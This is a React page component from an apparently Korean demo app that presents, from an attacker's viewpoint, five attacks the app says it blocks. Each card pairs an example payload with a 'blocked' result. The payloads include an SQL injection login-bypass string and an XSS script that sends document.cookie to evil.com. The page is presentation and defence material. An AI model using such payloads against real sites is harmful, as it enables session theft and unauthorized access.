import React, { useState } from 'react';
import { Link } from 'react-router-dom';

const ATTACKS = [
  {
    title: 'SQL Injection',
    icon: '🗡️',
    desc: '로그인 폼에 SQL 조작 코드를 입력해 인증을 우회하려는 시도',
    payload: `POST /api/auth/login\n{\n  "email": "admin' OR '1'='1 --",\n  "password": "anything"\n}`,
    result: '❌ 차단 — SQLI_ATTEMPT 로그 기록, 로그인 거부',
    color: 'orange'
  },
  {
    title: 'BruteForce',
    icon: '🔨',
    desc: '비밀번호를 맞출 때까지 자동으로 반복 로그인 시도',
    payload: `5회 연속 잘못된 비밀번호 입력\nPOST /api/auth/login × 5회`,
    result: '❌ 차단 — 60초 계정 잠금, BRUTE_FORCE_LOCK 기록',
    color: 'yellow'
  },
  {
    title: 'XSS (Cross-Site Scripting)',
    icon: '💀',
    desc: '상품 설명에 악성 스크립트를 삽입해 다른 사용자를 공격',
    payload: `상품 description:\n<script>fetch('//evil.com?c='+document.cookie)</script>`,
    result: '❌ 차단 — sanitize-html 정제, XSS_ATTEMPT 로그 기록',
    color: 'red'
  },
  {
    title: 'IDOR (Insecure Direct Object Reference)',
    icon: '🚪',
    desc: '다른 상인의 상품 ID를 직접 입력해 수정·삭제 시도',
    payload: `PUT /api/products/1\nAuthorization: Bearer <attacker_token>`,
    result: '❌ 차단 — 403 Forbidden, IDOR_ATTEMPT 로그 기록',
    color: 'purple'
  },
  {
    title: '위조 QR',
    icon: '🎭',
    desc: 'QR 토큰을 위조하거나 조작해 가짜 상품 페이지 노출 시도',
    payload: `GET /product/1?token=FAKE_TOKEN_12345`,
    result: '❌ 차단 — 위험 페이지 표시, FAKE_QR_ACCESS 로그 기록',
    color: 'cyan'
  },
];

const colorMap = {
  orange: { badge: 'bg-orange-900/40 border-orange-700/50 text-orange-400', code: 'text-orange-300' },
  yellow: { badge: 'bg-amber-900/40 border-amber-700/50 text-amber-400', code: 'text-amber-300' },
  red: { badge: 'bg-red-900/40 border-red-700/50 text-red-400', code: 'text-red-300' },
  purple: { badge: 'bg-purple-900/40 border-purple-700/50 text-purple-400', code: 'text-purple-300' },
  cyan: { badge: 'bg-cyan-900/40 border-cyan-700/50 text-cyan-400', code: 'text-cyan-300' },
};

export default function AttackerView() {
  const [selected, setSelected] = useState(null);

  return (
    <div className="max-w-4xl mx-auto px-4 py-8">
      <div className="mb-6">
        <Link to="/" className="text-zinc-500 hover:text-zinc-300 text-sm">← 홈으로</Link>
      </div>

      <div className="text-center mb-10">
        <div className="text-5xl mb-4">☠️</div>
        <h1 className="text-3xl font-bold text-zinc-100 mb-2">공격자 시점</h1>
        <p className="text-zinc-400">대충실드 QR이 방어하는 5가지 공격 패턴을 공격자 관점에서 확인합니다</p>
        <div className="mt-4 inline-flex items-center gap-2 bg-red-950/40 border border-red-800/50 rounded-full px-4 py-1.5 text-red-400 text-sm">
          🚨 이 페이지는 발표 시연용입니다 — 모든 공격은 차단됩니다
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
        {ATTACKS.map((a, i) => {
          const c = colorMap[a.color];
          return (
            <button
              key={i}
              onClick={() => setSelected(selected === i ? null : i)}
              className={`card text-left transition-all hover:border-zinc-600 ${selected === i ? `border-${a.color}-700/70` : ''}`}
            >
              <div className="flex items-start gap-3">
                <span className="text-3xl">{a.icon}</span>
                <div className="flex-1">
                  <h3 className="font-bold text-zinc-100 mb-1">{a.title}</h3>
                  <p className="text-sm text-zinc-500">{a.desc}</p>
                  {selected === i && (
                    <div className="mt-4 space-y-3">
                      <div>
                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">공격 시도</p>
                        <pre className={`text-xs font-mono whitespace-pre-wrap bg-zinc-800 rounded p-3 ${c.code}`}>{a.payload}</pre>
                      </div>
                      <div>
                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">결과</p>
                        <div className={`text-sm font-semibold border rounded-lg px-3 py-2 ${c.badge}`}>{a.result}</div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </button>
          );
        })}
      </div>

      {/* Try fake QR */}
      <div className="card border-red-700/30">
        <h3 className="font-semibold text-zinc-300 mb-2">🎭 위조 QR 직접 체험</h3>
        <p className="text-sm text-zinc-500 mb-4">아래 링크는 위조된 토큰을 포함한 QR URL입니다. 클릭하면 위험 페이지가 표시됩니다.</p>
        <a
          href="/product/1?token=FAKE_TOKEN_12345"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-zinc-800 font-mono text-sm text-red-400 p-3 rounded-lg hover:bg-zinc-700 break-all transition-colors"
        >
          http://localhost:5173/product/1?token=FAKE_TOKEN_12345
        </a>
        <p className="text-xs text-zinc-600 mt-2">→ 이 접근은 관리자 대시보드에 FAKE_QR_ACCESS로 기록됩니다</p>
      </div>

      <div className="text-center mt-8">
        <Link to="/admin" className="btn-primary">🛡️ 관리자 대시보드에서 탐지 확인</Link>
      </div>
    </div>
  );
}
